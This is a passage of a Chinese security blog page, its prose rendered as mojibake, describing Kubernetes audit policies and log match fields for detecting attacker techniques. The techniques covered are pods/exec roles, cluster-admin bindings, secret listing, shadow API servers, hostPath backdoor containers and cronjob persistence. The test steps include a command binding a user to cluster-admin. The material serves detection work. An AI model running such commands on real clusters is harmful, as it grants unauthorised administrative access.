      <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-3817&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-11-27</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 1919 words, 6 min 23 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/10/20/Kubernetes%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%AD%96%E7%95%A5-%E9%9B%86%E7%BE%A4%E8%AE%BF%E9%97%AE%E5%BC%82%E5%B8%B8/">Kubernetesæ—¥å¿—å®¡è®¡ç­–ç•¥-é›†ç¾¤è®¿é—®å¼‚å¸¸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg"></a></p>
<h2 id="æ£€æµ‹åˆ†æ"><a href="#æ£€æµ‹åˆ†æ" class="headerlink" title="æ£€æµ‹åˆ†æ"></a>æ£€æµ‹åˆ†æ</h2><h3 id="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é›†ç¾¤è§’è‰²æ‹¥æœ‰pod-execæƒé™-ï¼ˆæˆ–è€…æ‹¥æœ‰å…¶ä»–æƒé™ï¼‰"><a href="#å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é›†ç¾¤è§’è‰²æ‹¥æœ‰pod-execæƒé™-ï¼ˆæˆ–è€…æ‹¥æœ‰å…¶ä»–æƒé™ï¼‰" class="headerlink" title="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é›†ç¾¤è§’è‰²æ‹¥æœ‰pod&#x2F;execæƒé™ ï¼ˆæˆ–è€…æ‹¥æœ‰å…¶ä»–æƒé™ï¼‰"></a>å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é›†ç¾¤è§’è‰²æ‹¥æœ‰pod&#x2F;execæƒé™ ï¼ˆæˆ–è€…æ‹¥æœ‰å…¶ä»–æƒé™ï¼‰</h3><p>æµ‹è¯•é¡¹åç§°ï¼šå¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é›†ç¾¤è§’è‰²æ‹¥æœ‰pod&#x2F;execæƒé™ </p>
<p>æµ‹è¯•å†…å®¹ï¼šç³»ç»Ÿæ”¯æŒå¯¹é›†ç¾¤å¼‚å¸¸è¡Œä¸ºè¿›è¡Œæ£€æµ‹</p>
<p>æµ‹è¯•è¦æ±‚ï¼šèƒ½æ­£å¸¸æ£€æµ‹åˆ°å…¥ä¾µè¡Œä¸º</p>
<p>æµ‹è¯•æ­¥éª¤ï¼š</p>
<ol>
<li><p>ç™»å½•é›†ç¾¤èŠ‚ç‚¹</p>
</li>
<li><p>åˆ›å»ºé›†ç¾¤è§’è‰²</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply role.yaml</span><br></pre></td></tr></table></figure>

<p>role.yamlæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span> </span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">rwildcard</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>] <span class="comment"># &quot;&quot; indicates the core API group </span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods/exec&quot;</span>] </span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>ç™»å½•å®¹å™¨å®‰å…¨å¹³å°,æŸ¥çœ‹æ˜¯å¦æ£€æµ‹åˆ°è¯¥é£é™©è¡Œä¸º</li>
</ol>
<h4 id="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½"><a href="#å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½" class="headerlink" title="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½"></a>å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½</h4><p>å‡†å¤‡å®¡è®¡æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡rbac.authorization.k8s.ioç»„ä¸­çš„rolesèµ„æºçš„createåŠ¨ä½œ</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">audit.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">omitStages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;RequestReceived&quot;</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">level:</span> <span class="string">Request</span></span><br><span class="line">    <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>]</span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">group:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">        <span class="attr">resources:</span> [<span class="string">&quot;roles&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>é…ç½® API æœåŠ¡å™¨</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/manifests/kube-apiserver.yaml</span><br></pre></td></tr></table></figure>

<ol>
<li><p>åœ¨ <code>spec.containers.command</code> ä¸‹æ·»åŠ å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- --audit-log-maxage=30</span><br><span class="line">- --audit-log-maxbackup=1</span><br><span class="line">- --audit-log-maxsize=100</span><br><span class="line">- --audit-log-path=/var/log/audit/kube-apiserver-audit.log</span><br><span class="line">- --audit-policy-file=/etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨ <code>spec.containers.volumeMounts</code> ä¸‹æ·»åŠ ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- mountPath: /var/log/audit</span><br><span class="line">  name: audit-logs</span><br><span class="line">- mountPath: /etc/kubernetes/audit-policy</span><br><span class="line">  name: audit-policy</span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨ <code>spec.volumes</code> ä¸‹æ·»åŠ ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- hostPath:</span><br><span class="line">  path: /var/log/kubernetes/audit</span><br><span class="line">  type: &quot;&quot;</span><br><span class="line">  name: audit-logs</span><br><span class="line">- hostPath:</span><br><span class="line">  path: /etc/kubernetes/audit-policy</span><br><span class="line">  type: &quot;&quot;</span><br><span class="line">  name: audit-policy</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><p>æŸ¥çœ‹æ—¥å¿—</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/kubernetes/audit/kube-apiserver-audit.log</span><br></pre></td></tr></table></figure>

<p>åˆ†ææ—¥å¿—å†…å®¹ï¼Œå¹¶é‡ç‚¹å…³æ³¨ç‰¹å¾å­—æ®µ</p>
<table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
</tr>
</thead>
<tbody><tr>
<td>â€œverbsâ€:[â€œcreateâ€,â€getâ€,â€watchâ€,â€listâ€]</td>
<td>â€œresourcesâ€:[â€œpods&#x2F;execâ€]</td>
</tr>
</tbody></table>
<h3 id="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-ç»‘å®šç”¨æˆ·åˆ°é›†ç¾¤ç®¡ç†å‘˜è§’è‰²"><a href="#å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-ç»‘å®šç”¨æˆ·åˆ°é›†ç¾¤ç®¡ç†å‘˜è§’è‰²" class="headerlink" title="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-ç»‘å®šç”¨æˆ·åˆ°é›†ç¾¤ç®¡ç†å‘˜è§’è‰²"></a>å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-ç»‘å®šç”¨æˆ·åˆ°é›†ç¾¤ç®¡ç†å‘˜è§’è‰²</h3><p>æµ‹è¯•é¡¹åç§°ï¼šå¼‚å¸¸è¡Œä¸ºæ£€æµ‹-ç»‘å®šç”¨æˆ·åˆ°é›†ç¾¤ç®¡ç†å‘˜è§’è‰²</p>
<p>æµ‹è¯•å†…å®¹ï¼šç³»ç»Ÿæ”¯æŒå¯¹é›†ç¾¤å¼‚å¸¸è®¿é—®è¿›è¡Œç›‘æ§</p>
<p>æµ‹è¯•è¦æ±‚ï¼šèƒ½æ­£å¸¸æ£€æµ‹åˆ°å¼‚å¸¸è¡Œä¸º</p>
<p>å‰ç½®æ¡ä»¶ï¼šå·²ç»æ ¹æ®é¡µé¢å¸®åŠ©ä¿¡æ¯é…ç½®é›†ç¾¤å®¡è®¡è§„åˆ™ç‚¹å‡»ã€è®¾ç½®ã€‘-ã€å†…ç½®ç­–ç•¥ã€‘å¼€å¯å¯¹åº”æŠ¥è­¦</p>
<p>æµ‹è¯•æ­¥éª¤ï¼š</p>
<ol>
<li><p>ç™»å½•é›†ç¾¤masterèŠ‚ç‚¹</p>
</li>
<li><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>
</li>
<li><p>å°†åŒ¿åç”¨æˆ·ç»‘å®šåˆ°ç®¡ç†å‘˜è§’è‰² </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding root-cluster-admin-binding --clusterrole=cluster-admin --user=root </span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-1"><a href="#å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-1" class="headerlink" title="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½"></a>å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½</h4><p>å‡†å¤‡å®¡è®¡æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡rbac.authorization.k8s.ioç»„ä¸­çš„clusterrolebindingsèµ„æºçš„createåŠ¨ä½œ</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">audit.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">level:</span> <span class="string">Request</span></span><br><span class="line">  <span class="attr">users:</span> [<span class="string">&quot;kubernetes-admin&quot;</span>]</span><br><span class="line">  <span class="attr">userGroups:</span> [<span class="string">&quot;system:masters&quot;</span>,<span class="string">&quot;system:authenticated&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;create&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">group:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">      <span class="attr">resources:</span> [<span class="string">&quot;clusterrolebindings&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—åˆ†æ-1"><a href="#æ—¥å¿—åˆ†æ-1" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><p>æŸ¥çœ‹æ—¥å¿—</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/kubernetes/audit/kube-apiserver-audit.log</span><br></pre></td></tr></table></figure>

<p>åˆ†ææ—¥å¿—å†…å®¹ï¼Œå¹¶é‡ç‚¹å…³æ³¨ç‰¹å¾å­—æ®µ</p>
<table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
<th>match three</th>
</tr>
</thead>
<tbody><tr>
<td>â€œresourceâ€: â€œclusterrolebindingsâ€</td>
<td>â€œkindâ€:â€ClusterRoleBindingâ€</td>
<td>â€œnameâ€:â€rootâ€</td>
</tr>
</tbody></table>
<h3 id="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-Secretså¼‚å¸¸è®¿é—®"><a href="#å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-Secretså¼‚å¸¸è®¿é—®" class="headerlink" title="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-Secretså¼‚å¸¸è®¿é—®"></a>å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-Secretså¼‚å¸¸è®¿é—®</h3><h4 id="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-2"><a href="#å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-2" class="headerlink" title="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½"></a>å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½</h4><p>å‡†å¤‡å®¡è®¡æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡é»˜è®¤ç»„ä¸­çš„secretsèµ„æºçš„liståŠ¨ä½œ</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">audit.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">omitStages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;RequestReceived&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;ResponseStarted&quot;</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">level:</span> <span class="string">RequestResponse</span></span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;list&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">group:</span></span><br><span class="line">      <span class="attr">resources:</span> [<span class="string">&quot;secrets&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—åˆ†æ-2"><a href="#æ—¥å¿—åˆ†æ-2" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><p>æŸ¥çœ‹æ—¥å¿—</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/kubernetes/audit/kube-apiserver-audit.log</span><br></pre></td></tr></table></figure>

<p>åˆ†ææ—¥å¿—å†…å®¹ï¼Œå¹¶é‡ç‚¹å…³æ³¨ç‰¹å¾å­—æ®µ</p>
<table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
<th>match three</th>
</tr>
</thead>
<tbody><tr>
<td>â€œrequestURIâ€:â€&#x2F;api&#x2F;v1&#x2F;secrets?limit&#x3D;500â€</td>
<td>â€œdescriptionâ€:â€Data contains the secret data</td>
<td>â€œkubernetes.io&#x2F;service-account-tokenâ€</td>
</tr>
</tbody></table>
<h3 id="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-åˆ›å»ºå½±å­API-Server"><a href="#å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-åˆ›å»ºå½±å­API-Server" class="headerlink" title="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-åˆ›å»ºå½±å­API Server"></a>å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-åˆ›å»ºå½±å­API Server</h3><h4 id="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-3"><a href="#å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-3" class="headerlink" title="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½"></a>å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½</h4><p>å‡†å¤‡å®¡è®¡æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡é»˜è®¤ç»„ä¸­çš„podèµ„æºçš„createåŠ¨ä½œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: audit.k8s.io/v1 </span><br><span class="line">kind: Policy</span><br><span class="line">omitStages:</span><br><span class="line">  - <span class="string">&quot;RequestReceived&quot;</span></span><br><span class="line">rules:</span><br><span class="line">  <span class="comment"># åœ¨æ—¥å¿—ä¸­ç”¨ Request çº§åˆ«è®°å½• Pod å˜åŒ–ã€‚</span></span><br><span class="line">  - level: Request</span><br><span class="line">    verbs: [<span class="string">&quot;create&quot;</span>]</span><br><span class="line">    resources:</span><br><span class="line">    - group: <span class="string">&quot;&quot;</span></span><br><span class="line">      resources: [<span class="string">&quot;pods&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—åˆ†æ-3"><a href="#æ—¥å¿—åˆ†æ-3" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
<th>match three</th>
</tr>
</thead>
<tbody><tr>
<td>â€œnameâ€:â€kube-apiserverâ€</td>
<td>â€œâ€“allow-privileged&#x3D;trueâ€</td>
<td>â€œâ€“authorization-mode&#x3D;AlwaysAllowâ€</td>
</tr>
</tbody></table>
<h3 id="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é€šè¿‡k8sæ§åˆ¶å™¨åˆ›å»ºåé—¨å®¹å™¨"><a href="#å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é€šè¿‡k8sæ§åˆ¶å™¨åˆ›å»ºåé—¨å®¹å™¨" class="headerlink" title="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é€šè¿‡k8sæ§åˆ¶å™¨åˆ›å»ºåé—¨å®¹å™¨"></a>å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-é€šè¿‡k8sæ§åˆ¶å™¨åˆ›å»ºåé—¨å®¹å™¨</h3><h4 id="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-4"><a href="#å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-4" class="headerlink" title="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½"></a>å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½</h4><p>å‡†å¤‡å®¡è®¡æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡é»˜è®¤ç»„ä¸­çš„podèµ„æºçš„createåŠ¨ä½œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: audit.k8s.io/v1 </span><br><span class="line">kind: Policy</span><br><span class="line">omitStages:</span><br><span class="line">  - <span class="string">&quot;RequestReceived&quot;</span></span><br><span class="line">rules:</span><br><span class="line">  <span class="comment"># åœ¨æ—¥å¿—ä¸­ç”¨ RequestResponse çº§åˆ«è®°å½• Pod å˜åŒ–ã€‚</span></span><br><span class="line">  - level: RequestResponse</span><br><span class="line">    verbs: [<span class="string">&quot;create&quot;</span>]</span><br><span class="line">    resources:</span><br><span class="line">    - group: <span class="string">&quot;&quot;</span></span><br><span class="line">      resources: [<span class="string">&quot;pods&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—åˆ†æ-4"><a href="#æ—¥å¿—åˆ†æ-4" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
<th>match three</th>
</tr>
</thead>
<tbody><tr>
<td>verb: â€œcreateâ€</td>
<td>â€œresourceâ€: â€œdeploymentsâ€</td>
<td>â€œhostPathâ€:{â€œpathâ€:â€&#x2F;â€œ</td>
</tr>
</tbody></table>
<h3 id="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-k8s-cronjobæŒä¹…åŒ–"><a href="#å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-k8s-cronjobæŒä¹…åŒ–" class="headerlink" title="å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-k8s cronjobæŒä¹…åŒ–"></a>å¼‚å¸¸è¡Œä¸ºæ£€æµ‹-k8s cronjobæŒä¹…åŒ–</h3><h4 id="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-5"><a href="#å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½-5" class="headerlink" title="å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½"></a>å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½</h4><p>å‡†å¤‡å®¡è®¡æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/kubernetes/audit-policy/apiserver-audit-policy.yaml</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡é»˜è®¤ç»„ä¸­çš„podèµ„æºçš„createåŠ¨ä½œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: audit.k8s.io/v1 </span><br><span class="line">kind: Policy</span><br><span class="line">omitStages:</span><br><span class="line">  - <span class="string">&quot;RequestReceived&quot;</span></span><br><span class="line">rules:</span><br><span class="line">  <span class="comment"># åœ¨æ—¥å¿—ä¸­ç”¨ RequestResponse çº§åˆ«è®°å½• Pod å˜åŒ–ã€‚</span></span><br><span class="line">  - level: RequestResponse</span><br><span class="line">    verbs: [<span class="string">&quot;create&quot;</span>]</span><br><span class="line">    resources:</span><br><span class="line">    - group: <span class="string">&quot;&quot;</span></span><br><span class="line">      resources: [<span class="string">&quot;pods&quot;</span>]</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—åˆ†æ-5"><a href="#æ—¥å¿—åˆ†æ-5" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h4><table>
<thead>
<tr>
<th>match one</th>
<th>match two</th>
<th>match three</th>
</tr>
</thead>
<tbody><tr>
<td>verb: â€œcreateâ€</td>
<td>â€œresourceâ€: â€œcronjobsâ€</td>
<td></td>
</tr>
</tbody></table>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-10-20</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 1224 words, 4 min 4 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>